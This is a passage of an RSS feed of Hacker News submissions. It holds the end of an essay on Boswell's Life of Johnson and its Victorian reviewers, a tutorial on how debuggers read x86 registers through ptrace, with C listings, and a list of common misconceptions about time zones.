of one of the posts at the side of the foot pavement, and sent forth peals so loud, that in the silence of the night his voice seemed to resound from Temple-bar to Fleet ditch.</p></blockquote><p>And around Johnson he painted an entire dramatic cast, bringing 18th century London to life: Garrick the great actor, Reynolds the painter, Beauclerk with his banter, Goldsmith with his insecurities. Monboddo and Burke, Henry and Hester Thrale, the blind Mrs Williams and the Jamaican freedman Francis Barber.</p><p>Borges (who was also a big fan) finds his parallels not in Shakespeare and Falstaff, but in Cervantes and Don Quixote. He (rather implausibly) suggests that every Quixote needs his Sancho, and "Boswell appears as a despicable character" deliberately to create a contrast.<span><a href="#fn10521873804" rel="footnote"><sup id="fnref10521873804">4</sup></a></span></p><p>And in the 1830s, two brilliant and influential reviews were written by two polar opposites: arch-progressive Thomas Babington Macaulay and radical reactionary Thomas Carlyle. The first thing you'll notice is their sheer magnitude: <a href="https://oll-resources.s3.amazonaws.com/titles/362/1227.01_Bk.pdf" target="_blank" rel="noopener">Macaulay's</a> is 55 pages long, while <a href="https://sci-hub.se/https://doi.org/10.1017/CBO9780511697234.003" target="_blank" rel="noopener">Carlyle's review in Fraser's Magazine</a> reaches 74 pages!<span><a href="#fn10521873805" rel="footnote"><sup id="fnref10521873805">5</sup></a></span> And while they both agree that it's a great book and that Boswell was a scoundrel, they have very different theories about what happened.</p><h2 id="Macaulay"><a href="#Macaulay" title="Macaulay"></a>Macaulay</h2><p>Never in history, Macaulay says, has there been "so strange a phænomenon as this book". On the one hand he has effusive praise:</p><blockquote><p>Homer is not more decidedly the first of heroic poets, Shakspeare is not more decidedly the first of dramatists, Demosthenes is not more decidedly the first of orators, than Boswell is the first of biographers. He has no second. He has distanced all his competitors so decidedly that it is not worth while to place them.</p></blockquote><p>On the other hand, he spends several paragraphs laying into Boswell with gusto:</p><blockquote><p>He was, if we are to give any credit to his own account or to the united testimony of all who knew him, a man of the meanest and feeblest intellect. [...] He was the laughing-stock of the whole of that brilliant society which has owed to him the greater part of its fame. He was always laying himself at the feet of some eminent man, and begging to be spit upon and trampled upon. [...] Servile and impertinent, shallow and pedantic, a bigot and a sot, bloated with family pride, and eternally blustering about the dignity of a born gentleman, yet stooping to be a talebearer, an eavesdropper, a common butt in the taverns of London.</p></blockquote><p>Macaulay's theory is that while Homer and Shakespeare and all the other greats owe their eminence to their virtues, Boswell is unique in that he owes <em>his</em> success to his vices.</p><blockquote><p>He was a slave, proud of his servitude, a Paul Pry, convinced that his own curiosity and garrulity were virtues, an unsafe companion who never scrupled to repay the most liberal hospitality by the basest violation of confidence, a man without delicacy, without shame, without sense enough to know when he was hurting the feelings of others or when he was exposing himself to derision; and because he was all this, he has, in an important department of literature, immeasurably surpassed such writers as Tacitus, Clarendon, Alfieri, and his own idol Johnson.</p></blockquote><blockquote><p>Of the talents which ordinarily raise men to eminence as writers, Boswell had absolutely none. There is not in all his books a single remark of his own on literature, politics, religion, or society, which is not either commonplace or absurd. [...] Logic, eloquence, wit, taste, all those things which are generally considered as making a book valuable, were utterly wanting to him. He had, indeed, a quick observation and a retentive memory. These qualities, if he had been a man of sense and virtue, would scarcely of themselves have sufficed to make him conspicuous; but, because he was a dunce, a parasite, and a coxcomb, they have made him immortal.</p></blockquote><p>The work succeeds partly because of its subject: if Johnson had not been so extraordinary, then airing all his dirty laundry would have just made him look bad.</p><blockquote><p>No man, surely, ever published such stories respecting persons whom he professed to love and revere. He would infallibly have made his hero as contemptible as he has made himself, had not his hero really possessed some moral and intellectual qualities of a very high order. The best proof that Johnson was really an extraordinary man is that his character, instead of being degraded, has, on the whole, been decidedly raised by a work in which all his vices and weaknesses are exposed.</p></blockquote><p>And finally, Boswell provided Johnson with a curious form of literary fame:</p><blockquote><p>The reputation of [Johnson's] writings, which he probably expected to be immortal, is every day fading; while those peculiarities of manner and that careless …</p></blockquote></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://fantasticanachronism.com/2020/10/22/when-the-worst-man-in-the-world-writes-a-masterpiece/#">https://fantasticanachronism.com/2020/10/22/when-the-worst-man-in-the-world-writes-a-masterpiece/#</a></em></p>]]>
            </description>
            <link>https://fantasticanachronism.com/2020/10/22/when-the-worst-man-in-the-world-writes-a-masterpiece/#</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870552</guid>
            <pubDate>Fri, 23 Oct 2020 15:33:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Debuggers Work: Getting and Setting x86 Registers]]>
            </title>
            <description>
<![CDATA[
Score 139 | Comments 12 (<a href="https://news.ycombinator.com/item?id=24870497">thread link</a>) | @tosh
<br/>
October 23, 2020 | https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-1/ | <a href="https://web.archive.org/web/*/https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/cpu-context-switch.svg" alt="Context Switch"></p>

<p>In this article, I would like to shortly describe the methods used
to dump and restore the different kinds of registers on 32-bit
and 64-bit x86 CPUs.  The first part will focus on General Purpose
Registers, Debug Registers and Floating-Point Registers up to the XMM
registers provided by the SSE extension.  I will explain how their
values can be obtained via the <code>ptrace(2)</code> interface.</p>

<p>The <code>ptrace(2)</code> API is commonly used in all modern BSD systems
and Linux, as all of them derive it from the original form designed
and implemented in 4.3BSD.  The primary focus in this article is
on the FreeBSD and NetBSD systems.  Nevertheless, the users of other
Operating Systems such as OpenBSD, DragonFly BSD or Linux can still
benefit from this article as the basic principles are the same
and the code examples are intended to be easily adapted to other
platforms.</p>

<p>A single CPU (in modern hardware: CPU core or CPU thread,
if hyperthreading is available) can execute only one program thread
at a time.  In order to be able to run multiple processes and threads
quasi-simultaneously, the Operating System must perform <em>context
switching</em> — that is periodically suspend the currently running thread,
save its state, restore the saved state of another thread and resume it.
Saving and restoring the values of the processor’s registers play
an important part in context switching.  It is important that
this process is fully transparent to the process being switched,
and in a properly implemented kernel there should be no side effects
that are perceptible to the program.</p>

<p>The debugger may need to examine the register sets of the debugged
program for a number of reasons.  By inspecting the Program Counter,
it is able to determine the location in source code at which
the execution will continue, and by altering it it can control
the execution.  The Stack Pointer is necessary to introspect variables
stored on the stack, while the remaining registers can hold variables
themselves.</p>

<p>A special set of the x86 registers are the Debug Registers.  They are
not accessible to the program itself; however, they can be read
or written by the debugger.  They allow setting hardware assisted
breakpoints (instruction execute trap) on the code being executed,
and watchpoints (read and/or write operation trap) on the variables.</p>

<h2 id="general-purpose-registers-gpr">General Purpose Registers (GPR)</h2>

<h3 id="copying-gprs">Copying GPRs</h3>

<p>The term ‘General Purpose Registers’ is a bit ambiguous.
In the narrower sense, it means the few (8 on i386, 16 on amd64)
baseline registers that can be used to store arbitrary data (usually
integers or pointers).  In the wider sense it means all baseline
registers in the processor architecture, historically excluding
floating-point registers and special kinds of registers.  On x86, this
includes the ‘narrower sense’ general-purpose registers, the Program
Counter (EIP/RIP), segment registers and the flag register.</p>

<p>The majority of the General Purpose Registers can be copied directly,
e.g. using the <code>MOV</code> instruction, or pushed onto the stack
via <code>PUSH</code>.  The EIP/RIP register can be copied using the <code>LEA</code>
instruction, and restored via <code>JMP</code>.  The flag register can be pushed
onto the stack via <code>PUSHFD</code>/<code>PUSHFQ</code>, and afterwards popped from it
via <code>POPFD</code>/<code>POPFQ</code>.</p>

<p>The listing below demonstrates a program that grabs the values of all
amd64 GPRs at an arbitrary point during the execution and prints them
after returning from assembly.</p>

<p>(<a href="https://github.com/Moritz-Systems/how-debuggers-work-registers-part-1/blob/master/dump-gpr.c">standalone example source</a>,
 <a href="#the-gpr-ptrace-2-api">skip listing</a>)</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;

enum {
    R_RAX, R_RBX, R_RCX, R_RDX, R_RSI, R_RDI, R_RBP, R_RSP,
    R_R8, R_R9, R_R10, R_R11, R_R12, R_R13, R_R14, R_R15,
    R_RIP, R_RFLAGS,
    R_LENGTH
};

enum {
    S_CS, S_DS, S_ES, S_FS, S_GS, S_SS,
    S_LENGTH
};

int main()
{
    uint64_t gpr[R_LENGTH];
    uint16_t seg[S_LENGTH];

    asm volatile (
        /* fill registers with random data */
        "mov $0x0102030405060708, %%rax\n\t"
        "mov $0x1112131415161718, %%rbx\n\t"
        "mov $0x2122232425262728, %%rcx\n\t"
        "mov $0x3132333435363738, %%rdx\n\t"
        "mov $0x4142434445464748, %%rsi\n\t"
        "mov $0x5152535455565758, %%rdi\n\t"
        /* RBP is used for frame pointer, RSP is stack pointer */
        "mov $0x8182838485868788, %%r8\n\t"
        "mov $0x9192939495969798, %%r9\n\t"
        "mov $0xa1a2a3a4a5a6a7a8, %%r10\n\t"
        "mov $0xb1b2b3b4b5b6b7b8, %%r11\n\t"
        "mov $0xc1c2c3c4c5c6c7c8, %%r12\n\t"
        "mov $0xd1d2d3d4d5d6d7d8, %%r13\n\t"
        "mov $0xe1e2e3e4e5e6e7e8, %%r14\n\t"
        "mov $0xf1f2f3f4f5f6f7f8, %%r15\n\t"

        /* dump GPRs */
        "mov %%rax, %[rax]\n\t"
        "mov %%rbx, %[rbx]\n\t"
        "mov %%rcx, %[rcx]\n\t"
        "mov %%rdx, %[rdx]\n\t"
        "mov %%rsi, %[rsi]\n\t"
        "mov %%rdi, %[rdi]\n\t"
        "mov %%rbp, %[rbp]\n\t"
        "mov %%rsp, %[rsp]\n\t"
        "mov %%r8, %[r8]\n\t"
        "mov %%r9, %[r9]\n\t"
        "mov %%r10, %[r10]\n\t"
        "mov %%r11, %[r11]\n\t"
        "mov %%r12, %[r12]\n\t"
        "mov %%r13, %[r13]\n\t"
        "mov %%r14, %[r14]\n\t"
        "mov %%r15, %[r15]\n\t"
        /* dump RIP */
        "lea (%%rip), %%rbx\n\t"
        "mov %%rbx, %[rip]\n\t"
        "mov %[rbx], %%rbx\n\t"
        /* dump segment registers */
        "mov %%cs, %[cs]\n\t"
        "mov %%ds, %[ds]\n\t"
        "mov %%es, %[es]\n\t"
        "mov %%fs, %[fs]\n\t"
        "mov %%gs, %[gs]\n\t"
        "mov %%ss, %[ss]\n\t"
        /* dump RFLAGS */
        "pushfq\n\t"
        "popq %[rflags]\n\t"

        : [rax] "=m"(gpr[R_RAX]), [rbx] "=m"(gpr[R_RBX]),
          [rcx] "=m"(gpr[R_RCX]), [rdx] "=m"(gpr[R_RDX]),
          [rsi] "=m"(gpr[R_RSI]), [rdi] "=m"(gpr[R_RDI]),
          [rbp] "=m"(gpr[R_RBP]), [rsp] "=m"(gpr[R_RSP]),
           [r8] "=m"(gpr[ R_R8]), [ r9] "=m"(gpr[ R_R9]),
          [r10] "=m"(gpr[R_R10]), [r11] "=m"(gpr[R_R11]),
          [r12] "=m"(gpr[R_R12]), [r13] "=m"(gpr[R_R13]),
          [r14] "=m"(gpr[R_R14]), [r15] "=m"(gpr[R_R15]),
          [rip] "=m"(gpr[R_RIP]), [rflags] "=m"(gpr[R_RFLAGS]),
          [cs] "=m"(seg[S_CS]), [ds] "=m"(seg[S_DS]),
          [es] "=m"(seg[S_ES]), [fs] "=m"(seg[S_FS]),
          [gs] "=m"(seg[S_GS]), [ss] "=m"(seg[S_SS])
        :
        : "%rax", "%rbx", "%rcx", "%rdx", "%rsi", "%rdi",
          "%r8", "%r9", "%r10", "%r11", "%r12", "%r13", "%r14", "%r15",
          "memory"
    );

    printf("rax = 0x%016lx\n", gpr[R_RAX]);
    printf("rbx = 0x%016lx\n", gpr[R_RBX]);
    printf("rcx = 0x%016lx\n", gpr[R_RCX]);
    printf("rdx = 0x%016lx\n", gpr[R_RDX]);
    printf("rsi = 0x%016lx\n", gpr[R_RSI]);
    printf("rdi = 0x%016lx\n", gpr[R_RDI]);
    printf("rbp = 0x%016lx\n", gpr[R_RBP]);
    printf("rsp = 0x%016lx\n", gpr[R_RSP]);
    printf(" r8 = 0x%016lx\n", gpr[R_R8]);
    printf(" r9 = 0x%016lx\n", gpr[R_R9]);
    printf("r10 = 0x%016lx\n", gpr[R_R10]);
    printf("r11 = 0x%016lx\n", gpr[R_R11]);
    printf("r12 = 0x%016lx\n", gpr[R_R12]);
    printf("r13 = 0x%016lx\n", gpr[R_R13]);
    printf("r14 = 0x%016lx\n", gpr[R_R14]);
    printf("r15 = 0x%016lx\n", gpr[R_R15]);
    printf("rip = 0x%016lx\n", gpr[R_RIP]);
    printf("cs = 0x%04x\n", seg[S_CS]);
    printf("ds = 0x%04x\n", seg[S_DS]);
    printf("es = 0x%04x\n", seg[S_ES]);
    printf("fs = 0x%04x\n", seg[S_FS]);
    printf("gs = 0x%04x\n", seg[S_GS]);
    printf("ss = 0x%04x\n", seg[S_SS]);
    printf("rflags = 0x%016lx\n", gpr[R_RFLAGS]);

    return 0;
}
</code></pre>

<h3 id="the-gpr-ptrace-2-api">The GPR ptrace(2) API</h3>

<p>Both FreeBSD and NetBSD use the <code>PT_GETREGS</code> request to get the values
of GPRs from the program, and <code>PT_SETREGS</code> to update them.
The requests take a pointer to <code>struct reg</code> as an argument.</p>

<p>On FreeBSD, both i386 and amd64 have the individual registers listed
as fields of the struct.  On NetBSD, i386 uses a regular structure,
while amd64 puts all values into an array whose indices are defined
in the headers as constants.</p>

<p>The listing below compares the structures used on FreeBSD and NetBSD.
Note that NetBSD/amd64 uses a special macro.  For example,
<code>greg(rdi RDI, 0)</code> defines <code>_REG_RDI</code>.</p>

<p>(<a href="https://github.com/freebsd/freebsd/blob/master/sys/x86/include/reg.h#L99">FreeBSD structs</a>,
 <a href="https://github.com/NetBSD/src/blob/trunk/sys/arch/i386/include/reg.h#L70">NetBSD/i386 struct</a>,
 <a href="https://github.com/NetBSD/src/blob/trunk/sys/arch/amd64/include/reg.h#L45">NetBSD/amd64 struct</a>,
 <a href="https://github.com/NetBSD/src/blob/trunk/sys/arch/amd64/include/frame_regs.h#L6">NetBSD/amd64 register names</a>,
 <a href="#floating-point-registers">skip listing</a>)</p>

<pre><code>/* FreeBSD/i386 */               /* NetBSD/i386 */

struct __reg32 {                 struct reg {
    __uint32_t  r_fs;               int r_eax;
    __uint32_t  r_es;               int r_ecx;
    __uint32_t  r_ds;               int r_edx;
    __uint32_t  r_edi;              int r_ebx;
    __uint32_t  r_esi;              int r_esp;
    __uint32_t  r_ebp;              int r_ebp;
    __uint32_t  r_isp;              int r_esi;
    __uint32_t  r_ebx;              int r_edi;
    __uint32_t  r_edx;              int r_eip;
    __uint32_t  r_ecx;              int r_eflags;
    __uint32_t  r_eax;              int r_cs;
    __uint32_t  r_trapno;           int r_ss;
    __uint32_t  r_err;              int r_ds;
    __uint32_t  r_eip;              int r_es;
    __uint32_t  r_cs;               int r_fs;
    __uint32_t  r_eflags;           int r_gs;
    __uint32_t  r_esp;           };
    __uint32_t  r_ss;
    __uint32_t  r_gs;
};


/* FreeBSD/amd64 */              /* NetBSD/amd64 */

struct __reg64 {                 #define _FRAME_REG(greg, freg) \
    __int64_t   r_r15;               greg(rdi, RDI, 0) \
    __int64_t   r_r14;               greg(rsi, RSI, 1) \
    __int64_t   r_r13;               greg(rdx, RDX, 2) \
    __int64_t   r_r12;               greg(r10, R10, 6) \
    __int64_t   r_r11;               greg(r8,  R8,  4) \
    __int64_t   r_r10;               greg(r9,  R9,  5) \
    __int64_t   r_r9;                /* ... */ \
    __int64_t   r_r8;                greg(rcx, RCX, 3) \
    __int64_t   r_rdi;               greg(r11, R11, 7) \
    __int64_t   r_rsi;               greg(r12, R12, 8) \
    __int64_t   r_rbp;               greg(r13, R13, 9) \
    __int64_t   r_rbx;               greg(r14, R14, 10) \
    __int64_t   r_rdx;               greg(r15, R15, 11) \
    __int64_t   r_rcx;               greg(rbp, RBP, 12) \
    __int64_t   r_rax;               …</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-1/">https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-1/</a></em></p>]]>
            </description>
            <link>https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870497</guid>
            <pubDate>Fri, 23 Oct 2020 15:29:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CSS Spider – fast and easy way to check, copy and edit CSS]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 15 (<a href="https://news.ycombinator.com/item?id=24870450">thread link</a>) | @URfejk
<br/>
October 23, 2020 | https://cssspider.fresalabs.com/home | <a href="https://web.archive.org/web/*/https://cssspider.fresalabs.com/home">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://cssspider.fresalabs.com/home</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870450</guid>
            <pubDate>Fri, 23 Oct 2020 15:25:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Falsehoods programmers believe about time zones]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 16 (<a href="https://news.ycombinator.com/item?id=24870376">thread link</a>) | @Gedxx
<br/>
October 23, 2020 | https://www.zainrizvi.io/blog/falsehoods-programmers-believe-about-time-zones/ | <a href="https://web.archive.org/web/*/https://www.zainrizvi.io/blog/falsehoods-programmers-believe-about-time-zones/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
			<!-- .cover -->


				<div>
					<p>My aunt has a problem</p><p>She loves joining Zoom meetings, but they're all hosted in different time zones. It's hard to remember if she should add 4 hours, subtract 3, or what. She's not the most technical person, so google isn't an option. She has to ask for help.</p><p>Every. Single. Time.</p><p>And, for the less technically minded, it's also error-prone.</p><p>Last a couple weeks ago I thought:</p><p>What if event organizers could share a link that would do the work for you? If someone clicked on <a href="https://www.zainrizvi.io/blog/falsehoods-programmers-believe-about-time-zones/mytime.io/5pm/EST">mytime.at/5pm/EST</a>, they would see their local version of that time. It sounded simple enough.</p><p>I began coding. </p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/image-5.png" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/image-5.png 600w, https://www.zainrizvi.io/content/images/2020/10/image-5.png 699w"><figcaption>I later discovered mytime.io had already implemented a very similar thing, and run into the same pitfalls</figcaption></figure><p>I knew trying to manage time <a href="https://www.youtube.com/watch?v=-5wpm-gesOY">is a fool's errand</a>, but that's what datetime libraries are for. I would merely build an extra time zone conversion layer on top.</p><p>Surely that couldn't be complicated</p><p>...Right?</p><p>I soon discovered just how wrong I was. One after another, I kept learning the falsehood of yet another "fact" that had seemed obviously true. Eventually my original vision became literally impossible to pull off without making serious compromises (more about that in a future blog post).</p><p>Hopefully this list will help you avoid the landmines I stepped on. All the falsehoods below are ones I'd considered true at some point in my adult life. </p><p>Most of them I believed just one month ago.</p><h3 id="misconception-1-utc-offsets-go-from-12-to-12"><strong>Misconception #1: UTC offsets go from -12 to +12</strong></h3><p>Turns out, UTC offsets span from -12 to +14. Yeah, +14. That's gives you 27 hours UTC can be offset by (don't forget the zero offset)</p><p>How does it work? UTC-12 has the same time as UTC+12, but is one day behind. Same goes for UTC-11 and UTC+13, etc.</p><p>Why that crazy range? That was a result of pacific islanders decided they wanted to be on a specific side of the international date line. </p><p>It makes for a very jagged international date line</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/pasted-image-0--1-.png" alt="" srcset="https://www.zainrizvi.io/content/images/2020/10/pasted-image-0--1-.png 600w"></figure><h3 id="misconception-2-every-utc-offset-corresponds-to-exactly-one-time-zone">Misconception #2: Every UTC offset corresponds to exactly one time zone</h3><p>Here are 10 distinct time zones which are all at UTC+5:</p><ul><li>Aqtobe Time</li><li>Mawson Time</li><li>Maldives Time</li><li>Oral Time</li><li>Pakistan Standard Time</li><li>French Southern and Antarctic Time</li><li>Tajikistan Time</li><li>Turkmenistan Time</li><li>Uzbekistan Time</li><li>Yekaterinburg Time</li></ul><p>You might be wondering: if they’re all at the same UTC offset, why couldn’t all those countries just use the same time zone? Perhaps Pakistanis weren’t keen about being on “Yekaterinburg Time”</p><h3 id="misconception-3-there-are-more-countries-in-the-world-than-time-zones">Misconception #3: <strong>There are more countries in the world than time zones</strong></h3><p>How could this one possibly be wrong? Well...</p><ol><li>Many countries want their very own time zone (how many do you think run on Myanmar Time?)</li><li>Some countries split themselves up into multiple time zones (e.g. eastern and western times)</li><li>Military time alone uses 25 time zones, one for each hour from UTC-12 to UTC+12</li><li>DST. More on this one below</li></ol><p>All together, there are<a href="https://www.timeanddate.com/time/zones/"> 244 time zones</a> used by the 195 countries in the world.</p><h3 id="misconception-4-every-time-zone-has-exactly-one-agreed-upon-name">Misconception #4: <strong>Every time zone has exactly one agreed upon name</strong></h3><p>Ever notice how every time zone consists only of English words? Awfully kind of Spanish and French speaking countries to graciously use our language, right?</p><p>Hah, Yeah right. </p><p>Eastern Standard Time, Tiempo del Este, and Heure Normale de l'Est are all different names for the exact same time zone.</p><p>Have fun coding that into your library.</p><h3 id="misconception-5-time-zones-are-always-offset-from-utc-by-an-integer-number-of-hours">Misconception #5: <strong>Time zones are always offset from UTC by an integer number of hours</strong></h3><p>India standard time is five and a half hours off of UTC. There are many more examples</p><h3 id="misconception-6-fine-time-zones-are-always-offset-from-utc-by-an-integer-number-of-half-hours">Misconception #6: <strong>Fine, time zones are always offset from UTC by an integer number of half-hours</strong></h3><p>Nepal likes to be at the 45 minute UTC offset.</p><p>Why does that extra 15 minutes matter so much to them? Because<a href="https://www.bbc.com/news/world-asia-33815153#:~:text=Nepal%20is%205%20hours%20and,a%20mountain%20east%20of%20Kathmandu.&amp;text=It%20gets%20trickier%20in%20the,t%20officially%20have%20time%20zones."> they really want</a> their mountain to have the sun right above it at noon.</p><p>But it makes you wonder: what would happen if the mountain ever shifted?</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/mountain-moved-3.jpeg" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/mountain-moved-3.jpeg 600w, https://www.zainrizvi.io/content/images/size/w1000/2020/10/mountain-moved-3.jpeg 1000w, https://www.zainrizvi.io/content/images/size/w1600/2020/10/mountain-moved-3.jpeg 1600w, https://www.zainrizvi.io/content/images/2020/10/mountain-moved-3.jpeg 2126w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-7-a-country-stays-at-the-same-utc-offset-all-year-long">Misconception #7: <strong>A country stays at the same UTC offset all year long</strong></h3><p>Don't forget about Daylight Saving Time! Or as the Europeans call it "Summer Time." &nbsp;</p><p>Countries practicing DST change their UTC offset twice every year.</p><h3 id="misconception-8-there-is-a-standard-format-for-declaring-time-zones">Misconception #8: <strong>There is a standard format for declaring time zones</strong></h3><p>Hah, I wish. Here are some standards I discovered, there may be more:</p><h4 id="common-name">Common name</h4><p>These are the traditional time zone names we’re used to. Example: Pacific Standard Time.</p><p>But I don't know if there's an official term for these names, they just that unstandardized.</p><h4 id="iana-zone-keys">IANA zone keys</h4><p>This is as close to the official standard as you can get. It's not at all official, but it's something the developer community has rallied around.</p><p>It's a <a href="https://www.iana.org/time-zones">painstakingly maintained database</a> which contains all known time zone data representing the entire history of local time for places around the globe. &nbsp;It doesn't give any zone a name though, preferring to use the name of the most prominent city in there, which leads to:</p><h4 id="prominent-city-based">Prominent city based</h4><p>This one is "<a href="https://twitter.com/pganssle/status/1319794747876253697">basically bad UI that derives from the IANA zone keys</a>"</p><p>Full time zone names come with naming complications, which we discussed above. If that wasn't enough fun, there's also the political implications of recognizing certain time zones such as Israel Standard Time.</p><p>Some developers took the safer route and identified time zones only by the name of a prominent city in it, not bothering to map it to a common name. That's why the Ubuntu time zone picker makes you select "New York'' instead of Eastern Standard Time.</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/image-4.png" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/image-4.png 600w, https://www.zainrizvi.io/content/images/2020/10/image-4.png 826w" sizes="(min-width: 720px) 720px"></figure><h4 id="forget-time-zones-use-the-raw-utc-offset">Forget time zones, use the raw UTC offset</h4><p>W3's international standard gave up on the notion of time zones and declared that engineers should only store a timestamp's<a href="https://www.w3.org/TR/NOTE-datetime"> raw UTC offset</a>.</p><h4 id="gps-coordinates">GPS Coordinates</h4><p>Fun fact: Many APIs for getting a region's UTC offset only want a UTC time and latitude/longitude coordinates. This lets them define any moment unambiguously and not have to worry about Daylight Saving Time.</p><p>If you squint your eyes a bit, you could consider this a fourth standard.</p><h3 id="misconception-9-daylight-saving-time-starts-at-the-same-time-every-year">Misconception #9: <strong>Daylight Saving Time starts at the same time every year</strong></h3><p>Did you think this would be the one thing world powers agree on? Each country choose when to start it's own DST</p><h3 id="misconception-10-a-country-s-time-zone-never-changes">Misconception #10: <strong>A country's time zone never changes</strong></h3><p>Almost every year some country will pass a law to edit their time zone.</p><p>In a particularly memorable example, a few years ago the Samoan islands wanted to be on the other side of the international date line to get the same weekends as their Australian trading partners. So on midnight Dec 29th, they changed their UTC offset from -11 to +13 UTC, skipping Dec 30th and going straight to Dec 31st.</p><p>Samoan citizens had one less day to celebrate the holidays that year.</p><p>On the plus side, just 40 miles away the American Samoa Islands stayed on the other side of the international date line. Now Samoans can celebrate new years on the Western Island, and then boat over to American Samoa for a second new year’s party the next night.</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/pasted-image-0--2-.png" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/pasted-image-0--2-.png 600w, https://www.zainrizvi.io/content/images/size/w1000/2020/10/pasted-image-0--2-.png 1000w, https://www.zainrizvi.io/content/images/2020/10/pasted-image-0--2-.png 1169w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-11-a-country-stays-in-the-same-time-zone-during-daylight-saving-time">Misconception #11: <strong>A country stays in the same time zone during Daylight Saving Time</strong></h3><p>Funny thing about DST, it doesn't actually change the time zone's UTC offset. &nbsp;Instead, Daylight Saving Time countries switch to a different time zone, with a different name.</p><p>For example:</p><p>Texas goes from Central Standard Time to Central Daylight Time.</p><p>Chile goes from Chile Standard Time to Chile Summer Time</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/dst-shift.jpeg" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/dst-shift.jpeg 600w, https://www.zainrizvi.io/content/images/size/w1000/2020/10/dst-shift.jpeg 1000w, https://www.zainrizvi.io/content/images/size/w1600/2020/10/dst-shift.jpeg 1600w, https://www.zainrizvi.io/content/images/2020/10/dst-shift.jpeg 2168w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-12-daylight-saving-time-starts-around-march-and-ends-around-october">Misconception #12: <strong>Daylight Saving Time starts around March and ends around October</strong></h3><p>The Southern hemisphere has their summer in the other half of the year. The pattern flips.</p><h3 id="misconception-13-every-time-zone-has-it-s-own-name">Misconception #13: <strong>Every time zone has it’s own name</strong></h3><p>Which country should get to claim "Eastern Standard Time"?</p><p>North America claimed dibs by virtue of inventing the name, but do you think no one objected? Australia thought it sounded like a fine name to use, and so even though the rest of the world refer to their time zone as Australian Eastern Standard Time, it's own citizens just call it "Eastern Standard Time".</p><h3 id="misconception-14-every-time-zone-has-its-own-abbreviation">Misconception #14: <strong>Every time zone has its own abbreviation</strong></h3><p>Which of these was meant when someone says CST?</p><ul><li>Central Standard Time</li><li>China Standard Time</li><li>Cuba Standard Time</li></ul><p>And remember how the time zone name changes during Daylight Saving Time? Many people don’t know that and keep using the wrong abbreviations during DST months. CST might be used for Central Daylight Time.</p><p>If there's no standard name for time zones, can you really expect one for the abbreviations?</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/fake-franks.jpeg" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/fake-franks.jpeg 600w, https://www.zainrizvi.io/content/images/size/w1000/2020/10/fake-franks.jpeg 1000w, https://www.zainrizvi.io/content/images/2020/10/fake-franks.jpeg 1020w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-15-there-is-always-an-unambiguous-conversion-from-one-time-zone-to-another">Misconception #15: <strong>There is always an unambiguous conversion from one time zone to another</strong></h3><p>If I say I want to convert 5pm Eastern Standard Time to Pakistan Standard Time, <s>am I talking about the American or Australian Eastern Standard Time?</s> (Aussies <a href="https://www.reddit.com/r/programming/comments/jggx3l/falsehoods_programmers_believe_about_time_zones/g9qv6cc/">are claiming</a> they say the full Australian Eastern Standard Time)</p><p>And is Daylight Saving Time in effect or not?</p><p>Okay, it’s tricky. But surely if we include the date and the exact city, then we'd be able to do the conversion reliably, right?</p><p>What if the date and time are 1:30 am on Nov 1st, 2020, right when US DST ends and the clock moves backwards?</p><p>1:30am occurs twice that morning, how do you know which instance was intended?</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/deja-vu.jpeg" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/deja-vu.jpeg 600w, https://www.zainrizvi.io/content/images/size/w1000/2020/10/deja-vu.jpeg 1000w, https://www.zainrizvi.io/content/images/2020/10/deja-vu.jpeg 1474w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-16-your-time-zone-library-can-recognize-any-time-zone-you-are-using-a-library-for-this-right-">Misconception #16: <strong>Your time zone library can recognize any time zone (you are using a library for this, right?)</strong></h3><p>Remember all those different potential time zone names and formats? Most libraries will only support one.</p><p>And they might be limited by the time zones installed on your local machine.</p><p>Yeah, really.</p><p>Remember, if time zones can change based on the whims of a local government, then the library will need some external dataset to base its calculations off of. That external dataset just might be the time zones installed on your PC.</p><h3 id="misconception-17-the-entire-country-always-shifts-during-daylight-saving-time">Misconception #17: <strong>The entire country always shifts during Daylight Saving Time</strong></h3><p>In the US, 